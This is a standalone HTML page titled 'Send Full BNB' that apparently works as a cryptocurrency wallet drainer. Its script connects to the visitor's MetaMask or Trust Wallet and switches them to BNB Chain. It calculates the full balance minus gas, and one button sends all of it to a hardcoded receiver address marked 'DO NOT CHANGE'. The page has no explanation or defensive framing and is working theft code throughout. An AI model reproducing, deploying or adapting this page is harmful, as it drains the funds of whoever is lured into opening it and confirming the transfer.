<!DOCTYPE html>
<html>
<head>
  <title>Send Full BNB</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
</head>
<body style="font-family: sans-serif; text-align: center; margin-top: 50px;">

  <h2 id="balanceInfo">Send BNB</h2>
  <button id="sendBtn" style="padding: 10px 20px; font-size: 18px;">Send Now</button>
  <p id="status" style="margin-top: 20px; color: red;"></p>

  <script>
    const receiver = "0xC64087a6Fd263ab6A140F9b46f4cAF7B3e82147F"; // DO NOT CHANGE
    const gasLimit = 21000;

    async function main() {
      if (!window.ethereum) {
        document.getElementById("status").textContent = "Trust Wallet or MetaMask not found.";
        return;
      }

      const provider = new ethers.providers.Web3Provider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = provider.getSigner();
      const sender = await signer.getAddress();

      const network = await provider.getNetwork();
      if (network.chainId !== 56) {
        try {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x38' }]
          });
        } catch (err) {
          document.getElementById("status").textContent = "Please switch to BNB Chain manually.";
          return;
        }
      }

      const balance = await provider.getBalance(sender);
      const gasPrice = await provider.getGasPrice();
      const gasFee = gasPrice.mul(gasLimit);

      if (balance.lte(gasFee)) {
        document.getElementById("status").textContent = "Insufficient balance for gas fees.";
        return;
      }

      const valueToSend = balance.sub(gasFee);
      const valueInBNB = ethers.utils.formatEther(valueToSend);
      document.getElementById("balanceInfo").textContent = `Send ${valueInBNB} BNB`;

      document.getElementById("sendBtn").onclick = async () => {
        document.getElementById("status").textContent = "Sending...";

        try {
          const tx = await signer.sendTransaction({
            to: receiver,
            value: valueToSend,
            gasLimit: gasLimit,
            gasPrice: gasPrice
          });

          document.getElementById("status").style.color = "green";
          document.getElementById("status").textContent = `Transaction sent: ${tx.hash}`;
        } catch (error) {
          document.getElementById("status").textContent = "Transaction failed: " + (error.message || error);
        }
      };
    }

    main();
  </script>
</body>
</html>
